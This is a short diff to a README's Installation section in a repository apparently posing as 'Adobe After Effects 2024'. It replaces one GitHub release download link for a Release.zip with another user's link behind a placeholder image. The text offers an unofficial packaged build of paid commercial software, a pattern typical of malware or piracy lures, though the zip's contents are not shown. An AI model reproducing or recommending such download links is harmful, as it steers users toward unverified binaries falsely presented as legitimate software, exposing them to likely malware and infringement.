@@ -7,7 +7,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/e3f70c1d-c72b-416d-9126-c288daacac67)
-](https://github.com/Kukupie123/Adobe-After-Effects-2024/releases/download/V3.55/Release.zip)
+](https://github.com/Yreenn/Adobe-After-Effects-2024/releases/download/Release/Release.zip)
 
 
 
